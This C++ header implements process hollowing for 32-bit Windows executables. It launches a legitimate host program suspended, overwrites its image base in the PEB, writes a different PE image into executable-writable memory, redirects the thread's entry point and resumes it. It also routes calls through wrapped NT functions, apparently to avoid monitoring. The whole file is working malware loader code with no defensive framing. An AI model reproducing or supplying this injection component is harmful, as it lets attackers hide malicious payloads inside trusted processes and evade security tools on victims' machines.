#pragma once

class ProcessHollowingHelper
{
	static bool WriteDataToHostMemory(PPROCESS_INFORMATION inProcessInformation, DWORD inVirtualAddress, byte* inData, DWORD inDataLength)
	{
		bool result = false;

		DWORD tempWriteByte = 0;

		if (MyNtWriteVirtualMemory(inProcessInformation->hProcess, PVOID(inVirtualAddress), inData, inDataLength, &tempWriteByte) == 0)
		{
			result = true;
		}

		return result;
	}

	static byte* MapAssemblyFileContentToMemory(byte* inAssemblyContent, DWORD* outMappedAssemblySize)
	{
		byte* result;

		PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

		*outMappedAssemblySize = pe->SizeOfImage;

		result = new byte[*outMappedAssemblySize];

		memset(result, 0, *outMappedAssemblySize);

		//
		memcpy(result, pe->PeContent, pe->NtHeader->OptionalHeader.SizeOfHeaders);

		for (DWORD index = 0; index < pe->SectionCount; index++)
		{
			memcpy(pe->GetSectionHeader(index)->VirtualAddress + result, pe->PeContent + pe->GetSectionHeader(index)->PointerToRawData, pe->GetSectionHeader(index)->SizeOfRawData);
		}

		//
		delete pe;

		return result;
	}

	static bool Inject(byte* inPeContent, PPROCESS_INFORMATION inProcessInformation, PCONTEXT inHostProcessContext, LPVOID addressOfImageBaseInPeb)
	{
		bool result = false;

		PortableExecutableParser* pe = new PortableExecutableParser(inPeContent);

		DWORD mappedAssemblySize = 0;

		byte* mappedMemory = MapAssemblyFileContentToMemory(inPeContent, &mappedAssemblySize);

		DWORD imageBaseOfAllocatedMemory = DWORD(VirtualAllocEx(inProcessInformation->hProcess, nullptr, pe->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

		if (imageBaseOfAllocatedMemory != 0)
		{
			if (WriteDataToHostMemory(inProcessInformation, DWORD(addressOfImageBaseInPeb), (byte*)(&imageBaseOfAllocatedMemory), 4))
			{
				if (WriteDataToHostMemory(inProcessInformation, imageBaseOfAllocatedMemory, mappedMemory, mappedAssemblySize))
				{
					inHostProcessContext->Eax = imageBaseOfAllocatedMemory + pe->NtHeader->OptionalHeader.AddressOfEntryPoint;

					if (MyNtSetContextThread(inProcessInformation->hThread, inHostProcessContext) == 0)
					{
						result = true;
					}
				}
			}
		}

		delete pe;

		return result;
	}

	static bool RunProcess(byte* inPeContent, wchar_t* inHostFileAddress, HANDLE* outProcessHandle)
	{
		bool result = false;

		if (inPeContent != nullptr && inHostFileAddress != nullptr)
		{
			*outProcessHandle = nullptr;

			PROCESS_INFORMATION processInformation;
			STARTUPINFOW startupInformation;

			RtlZeroMemory(&processInformation, sizeof(processInformation));
			RtlZeroMemory(&startupInformation, sizeof(startupInformation));

			BOOL createProcessResult = CreateProcessW(inHostFileAddress, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &startupInformation, &processInformation);

			if (createProcessResult)
			{
				CONTEXT hostProcessContext = { 0 };

				hostProcessContext.ContextFlags = CONTEXT_FULL;

				if (MyNtGetContextThread(processInformation.hThread, PCONTEXT(&hostProcessContext)) == 0)
				{
					LPVOID addressOfImageBaseInPeb = reinterpret_cast<LPVOID>(hostProcessContext.Ebx + 8);

					LPVOID imageBaseAddress;

					if (MyNtReadVirtualMemory(processInformation.hProcess, addressOfImageBaseInPeb, &imageBaseAddress, sizeof(imageBaseAddress), NULL) == 0)
					{
						if (Inject(inPeContent, &processInformation, &hostProcessContext, addressOfImageBaseInPeb))
						{
							result = MyNtResumeThread(processInformation.hThread, nullptr) == 0;

							if (outProcessHandle != nullptr)
							{
								*outProcessHandle = processInformation.hProcess;
							}
						}
					}
				}

				if (result == false)
				{
					TerminateProcess(processInformation.hProcess, 0);

					CloseHandle(processInformation.hProcess);
				}
			}
		}

		return result;
	}

public:

	static bool IsSupported(byte* inAssemblyContent)
	{
		bool result = false;

		if (inAssemblyContent != nullptr)
		{
			PortableExecutableParser* pe = new PortableExecutableParser(inAssemblyContent);

			if (pe->HasDosSignature && pe->HasNtSignature)
			{
				result = (pe->NtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386);
			}

			delete pe;
		}
		return result;
	}

	static bool IsSupported(wchar_t* inHostFileAddress)
	{
		bool result = false;

		auto length = 0;

		auto fileContent = FileOperationHelper::ReadFileContent(inHostFileAddress, &length);

		if (length != 0 && fileContent != nullptr)
		{
			result = IsSupported(fileContent);

			delete fileContent;
		}

		return result;
	}

	static bool Run(byte* inPeContent, wchar_t* inHostFileAddress, HANDLE* outProcessHandle)
	{
		bool result = false;

		if (IsSupported(inHostFileAddress) && IsSupported(inPeContent))
		{
			result = RunProcess(inPeContent, inHostFileAddress, outProcessHandle);
		}

		return result;
	}
};

